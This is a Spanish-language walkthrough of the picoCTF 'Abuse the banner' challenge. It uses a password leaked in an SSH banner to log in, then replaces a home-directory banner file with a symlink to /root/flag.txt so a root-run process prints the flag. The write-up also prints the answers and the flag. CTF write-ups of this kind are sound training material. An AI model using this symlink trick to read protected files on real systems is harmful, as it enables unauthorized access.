## Descripción
Can you abuse the banner?

Additional details will be available after launching your challenge instance.

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 59759`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 60564`. From the above information abuse the machine and find the flag in the /root directory.
## Solución
Si nos conectamos al primer servidor obtenemos esto:
```shell
$ nc tethys.picoctf.net 59759
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
Si vamos al segundo servidor nos hacen varias preguntas antes de poder ingresar al servidor
```shell
$ nc tethys.picoctf.net 60564
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John
player@challenge:~$
```
En las pistas mencionan los links así que usamos el comando `ls -la` para listar los archivos incluyendo los ocultos, aparte de los links que tienen. Si vemos en el directorio de root vemos que hay un archivo llamado `flag.txt` pero no tenemos permisos de root.

Vemos que en el home de nuestro usuario hay un archivo que se llama "banner" que es el archivo que se muestra cada que nos conectamos con netcat a tethys.picoctf.net:
```shell
$ nc tethys.picoctf.net 60564
*************************************
**************WELCOME****************
*************************************
```
Podemos hacer un link desde el home hasta el archivo "flag.txt" que se llame "banner" pero antes borramos el archivo "banner":
```shell
$ rm banner 

player@challenge:~$ ln -s /root/flag.txt ~/banner
ln -s /root/flag.txt ~/banner
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ ls -l
ls -l
total 4
lrwxrwxrwx 1 player player 14 Apr 14 20:02 banner -> /root/flag.txt
-rw-r--r-- 1 root   root   13 Feb  7  2024 text
```
Si nos vamos del servidor y nos conectamos de nuevo nos sale esto:
```shell
$ nc tethys.picoctf.net 60564
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

what is the password?
```
## Notas adicionales
## Referencias
- https://www.futurelearn.com/info/courses/linux-for-bioinformatics/0/steps/201767
- [Top 10 Cybersecurity Conferences to Attend in 2025 (Global Guide)](https://sensorstechforum.com/top-10-cybersecurity-conferences-2025-global-guide/)
- https://search-guard.com/blog/john-draper-captain-crunch/